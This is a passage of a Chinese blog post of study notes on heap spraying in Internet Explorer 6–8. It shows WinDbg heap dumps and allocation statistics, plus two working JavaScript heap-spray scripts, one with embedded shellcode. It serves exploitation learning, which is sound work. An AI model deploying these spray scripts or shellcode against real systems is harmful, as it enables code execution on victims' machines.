00000000</div><div class="line">02b17ecc 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17ee8 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17f04 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17f20 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17f3c 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17f58 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17f74 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17f90 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17fac 00000000 00000000 00000000 00000000 00000000 00000000 00000000</div><div class="line">02b17fc8 00000000 00000000 00000000 000001f8 e8def613 ffff0100 00002000</div><div class="line">02b17fe4 45524f43 214e414c 90909090 90909090 90909090 90909090 90909090</div><div class="line">02b18000 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div></pre></td></tr></table></figure></p>
+<p>随意查看一条堆喷数据的所属堆块，看到分配的堆块大小为0x3fff8，分配的字节数和我们申请的数据大小并不一致：：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line">0:012&gt; !heap -p -a 02b15ddc  </div><div class="line">    address 02b15ddc found in</div><div class="line">    _HEAP @ 140000</div><div class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</div><div class="line">        02af3d38 8000 0000  [01]   02af3d40    3fff8 - (busy)</div><div class="line">0:012&gt; !heap -stat -h 140000</div><div class="line"> heap @ 00140000</div><div class="line">group-by: TOTSIZE max-display: 20</div><div class="line">    size     #blocks     total     ( %) (percent of total busy bytes)</div><div class="line">    3fff8 8 - 1fffc0  (43.92)</div><div class="line">    1fff8 7 - dffc8  (19.22)</div><div class="line">    7ff8 b - 57fa8  (7.55)</div><div class="line">    1ff8 26 - 4bed0  (6.51)</div></pre></td></tr></table></figure></p>
+<p>为了让堆块分配的字节数与申请的数据大小更接近，我们可以通过更改BSTR对象的大小来操作的分配字节数，修改前面的脚本，将chunksize值改成0x4000：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">0:012&gt; !heap -stat -h 140000</div><div class="line"> heap @ 00140000</div><div class="line">group-by: TOTSIZE max-display: 20</div><div class="line">    size     #blocks     total     ( %) (percent of total busy bytes)</div><div class="line">    8fc1 cc - 728dcc  (71.66)</div><div class="line">    1fff8 5 - 9ffd8  (6.26)</div><div class="line">    3fff8 2 - 7fff0  (5.00)</div><div class="line">    7ff8 b - 57fa8  (3.44)</div><div class="line">    1ff8 25 - 49ed8  (2.89)</div><div class="line">0:012&gt; !heap -flt s 8fc1</div><div class="line">    _HEAP @ 140000</div><div class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</div><div class="line">        001b8688 1200 0000  [01]   001b8690    08fc1 - (busy)</div><div class="line">        02a7ce98 1200 1200  [01]   02a7cea0    08fc1 - (busy)</div><div class="line">        02a9ce98 1200 1200  [01]   02a9cea0    08fc1 - (busy)</div><div class="line">        02abce98 1200 1200  [01]   02abcea0    08fc1 - (busy)</div><div class="line">        02ac5e98 1200 1200  [01]   02ac5ea0    08fc1 - (busy)</div></pre></td></tr></table></figure></p>
+<p>这里有%71.66分配到相同大小的内存块：0x8fc1字节，共分配了0xcc(204)次,接近我们喷射的次数（200）,并且分配的堆块值与我们想分配的数据大小比较接近。查看任意一个堆数据，可以看到堆块size域值为0x1200*8=0x9000，字符串长度为0x8000，因此两个堆块之间的垃圾数据为0x1000字节（忽略堆头、BSTR头这些小细节…）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">02af2e98 12001200 02ff01f6 00008000 45524f43 214e414c 90909090 90909090</div><div class="line">02af2eb4 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div><div class="line">02af2ed0 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div><div class="line">02af2eec 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div></pre></td></tr></table></figure></p>
+<p>网上常见的IE6、IE7的heap spray脚本，以下脚本若要适用于IE8需要使用substring函数来进行堆喷射：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'javascript'</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined"> </span></div><div class="line"><span class="undefined">    var Shellcode = unescape(</span></div><div class="line"><span class="undefined">    '%u7546%u7a7a%u5379'+   // ASCII</span></div><div class="line"><span class="undefined">    '%u6365%u7275%u7469'+   // FuzzySecurity</span></div><div class="line"><span class="undefined">    '%u9079');              //</span></div><div class="line"><span class="undefined">  </span></div><div class="line"><span class="undefined">    var NopSlide = unescape('%u9090%u9090');</span></div><div class="line"><span class="undefined">     </span></div><div class="line"><span class="undefined">    var headersize = 20;</span></div><div class="line"><span class="undefined">    var slack = headersize + Shellcode.length;</span></div><div class="line"><span class="undefined">     </span></div><div class="line"><span class="xml">    while (NopSlide.length <span class="tag">&lt; <span class="attr">slack</span>) <span class="attr">NopSlide</span> += <span class="string">NopSlide;</span></span></span></div><div class="line"><span class="undefined">    var filler = NopSlide.substring(0,slack);</span></div><div class="line"><span class="undefined">    var chunk = NopSlide.substring(0,NopSlide.length - slack);</span></div><div class="line"><span class="undefined">     </span></div><div class="line"><span class="xml">    while (chunk.length + slack <span class="tag">&lt; <span class="attr">0x40000</span>) <span class="attr">chunk</span> = <span class="string">chunk</span> + <span class="attr">chunk</span> + <span class="attr">filler</span>;</span></span></div><div class="line"><span class="undefined">    var memory = new Array();</span></div><div class="line"><span class="xml">    for (i = 0; i <span class="tag">&lt; <span class="attr">500</span>; <span class="attr">i</span>++)&#123; <span class="attr">memory</span>[<span class="attr">i</span>] = <span class="string">chunk</span> + <span class="attr">Shellcode</span> &#125;</span></span></div><div class="line"><span class="undefined">     </span></div><div class="line"><span class="undefined">    alert("allocation done");</span></div><div class="line"><span class="undefined"> </span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>IE6、IE7、IE8的heap spray脚本：<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">script</span> &gt;</span><span class="undefined"></span></div><div class="line"><span class="undefined">var nops = unescape("%u9090%u9090");</span></div><div class="line"><span class="undefined">var shellcode = unescape('%ue8fc%u0082%u0000%u8960%u31e5%u64c0%u508b%u8b30%u0c52%u528b%u8b14%u2872%ub70f%u264a%uff31%u3cac%u7c61%u2c02%uc120%u0dcf%uc701%uf2e2%u5752%u528b%u8b10%u3c4a%u4c8b%u7811%u48e3%ud101%u8b51%u2059%ud301%u498b%ue318%u493a%u348b%u018b%u31d6%uacff%ucfc1%u010d%u38c7%u75e0%u03f6%uf87d%u7d3b%u7524%u58e4%u588b%u0124%u66d3%u0c8b%u8b4b%u1c58%ud301%u048b%u018b%u89d0%u2444%u5b24%u615b%u5a59%uff51%u5fe0%u5a5f%u128b%u8deb%u6a5d%u8d01%ub285%u0000%u5000%u3168%u6f8b%uff87%ubbd5%ub5f0%u56a2%ua668%ubd95%uff9d%u3cd5%u7c06%u800a%ue0fb%u0575%u47bb%u7213%u6a6f%u5300%ud5ff%u6163%u636c%u4100');</span></div><div class="line"><span class="xml">while(nops.length <span class="tag">&lt; <span class="attr">0x100000</span>) <span class="attr">nops</span> += <span class="string">nops;</span></span></span></div><div class="line"><span class="undefined">nops = nops.substring(0,0x100000/2-32/2-4/2-2/2-shellcode.length);</span></div><div class="line"><span class="xml">document.write("nops length"+nops.length.toString()+"<span class="tag">&lt;<span class="name">br</span>&gt;</span>")</span></div><div class="line"><span class="xml">document.write("shellcode length"+shellcode.length.toString()+"<span class="tag">&lt;<span class="name">br</span>&gt;</span>")</span></div><div class="line"><span class="undefined">nops = nops + shellcode;</span></div><div class="line"><span class="undefined">var memory = new Array();</span></div><div class="line"><span class="undefined">for(var i=0;i&lt;500;i++)&#123;</span></div><div class="line"><span class="undefined">    //memory[i] += nops;</span></div><div class="line"><span class="undefined">    memory[i] = nops.substring(0,nops.length);</span></div><div class="line"><span class="undefined">&#125;</span></div><div class="line"><span class="undefined">alert("Test");</span></div><div class="line"><span class="undefined"></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>这里解释一下代码中的<code>0x100000/2-32/2-4/2-2/2-shellcode.length</code>，32字节是指堆块头（等等，堆块头不是8字节么，哪来的32字节？？？后面会解释），4字节、2字节分别是指BSTR头部和结束符。<br><br>Javascript中，当申请内存大小超过512KB的时候，会调用VirtualAlloc（申请的堆启示地址为0xXXXX0000），VirtualAlloc申请的堆结构如下，堆头占0x20字节：<br><br><img src="/img/learning notes of Heap Spray/0x02-4.png" alt="Heap Spray"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">0:012&gt; !heap -flt s fffe0</div><div class="line">    _HEAP @ 140000</div><div class="line">      HEAP_ENTRY Size Prev Flags    UserPtr UserSize - state</div><div class="line">        02ea0018 1fffc 0000  [0b]   02ea0020    fffe0 - (busy VirtualAlloc)</div><div class="line">        02fb0018 1fffc fffc  [0b]   02fb0020    fffe0 - (busy VirtualAlloc)</div><div class="line">        030c0018 1fffc fffc  [0b]   030c0020    fffe0 - (busy VirtualAlloc)</div><div class="line">        031d0018 1fffc fffc  [0b]   031d0020    fffe0 - (busy VirtualAlloc)</div><div class="line">        032e0018 1fffc fffc  [0b]   032e0020    fffe0 - (busy VirtualAlloc)</div><div class="line">        033f0018 1fffc fffc  [0b]   033f0020    fffe0 - (busy VirtualAlloc)</div><div class="line">        03500018 1fffc fffc  [0b]   03500020    fffe0 - (busy VirtualAlloc)</div><div class="line">        03610018 1fffc fffc  [0b]   03610020    fffe0 - (busy VirtualAlloc)</div><div class="line">        03720018 1fffc fffc  [0b]   03720020    fffe0 - (busy VirtualAlloc)</div><div class="line">        03830018 1fffc fffc  [0b]   03830020    fffe0 - (busy VirtualAlloc)</div><div class="line">        03940018 1fffc fffc  [0b]   03940020    fffe0 - (busy VirtualAlloc)</div><div class="line">        03a50018 1fffc fffc  [0b]   03a50020    fffe0 - (busy VirtualAlloc)</div><div class="line">        03b60018 1fffc fffc  [0b]   03b60020    fffe0 - (busy VirtualAlloc)</div></pre></td></tr></table></figure></p>
+<p>堆头数据(只知道前4节指向下一个堆块地址，后4字节指向前一个堆块地址，其他28字节内容并不清楚，网上暂时没有找到关于VirtualAlloc Chunk Header的资料)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">03b60000 03c70000 03a50000 00000000 00000000 00101000 00101000 00001020</div><div class="line">03b6001c 00000b00 000fffda 90909090 90909090 90909090 90909090 90909090</div><div class="line">03b60038 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div><div class="line">03b60054 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div><div class="line">03b60070 90909090 90909090 90909090 90909090 90909090 90909090 90909090</div></pre></td></tr></table></figure></p>
+<p>Windows 7 + IE9脚本：</p>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Windows/" rel="tag"># Windows</a>
+          
+            <a href="/tags/Exploitation/" rel="tag"># Exploitation</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2017/11/20/hxpCTF2017-zwiebel/" rel="next" title="hxpCTF2017 zwiebel">
+                <i class="fa fa-chevron-left"></i> hxpCTF2017 zwiebel
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/uploads/avatar.jpg"
+               alt="aftern00n" />
+          <p class="site-author-name" itemprop="name">aftern00n</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+          
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives/">
+                <span class="site-state-item-count">6</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">3</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              <a href="/tags/index.html">
+                <span class="site-state-item-count">5</span>
+                <span class="site-state-item-name">标签</span>
+              </a>
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+        </div>
+
+        
+        
+
+        
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#堆喷射学习笔记"><span class="nav-number">1.</span> <span class="nav-text">堆喷射学习笔记</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#0x01堆基础知识"><span class="nav-number">1.1.</span> <span class="nav-text">0x01堆基础知识</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#0x02堆喷射原理"><span class="nav-number">1.2.</span> <span class="nav-text">0x02堆喷射原理</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#应用程序内存模型"><span class="nav-number">1.2.1.</span> <span class="nav-text">应用程序内存模型</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#堆喷射基本思路"><span class="nav-number">1.2.2.</span> <span class="nav-text">堆喷射基本思路</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#滑板指令（slidecode）选取"><span class="nav-number">1.2.3.</span> <span class="nav-text">滑板指令（slidecode）选取</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Heap-Spray脚本"><span class="nav-number">1.2.4.</span> <span class="nav-text">Heap Spray脚本</span></a></li></ol></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy; 
+  <span itemprop="copyrightYear">2017</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">aftern00n</span>
+
+  
+</div>
+
+
+  <div class="powered-by">
+    由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+  </div>
+
+  <span class="post-meta-divider">|</span>
+
+  <div class="theme-info">
+    主题 &mdash;
+    <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+      NexT.Pisces
+    </a>
+  </div>
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.2"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.2"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.2"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.2"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.2"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
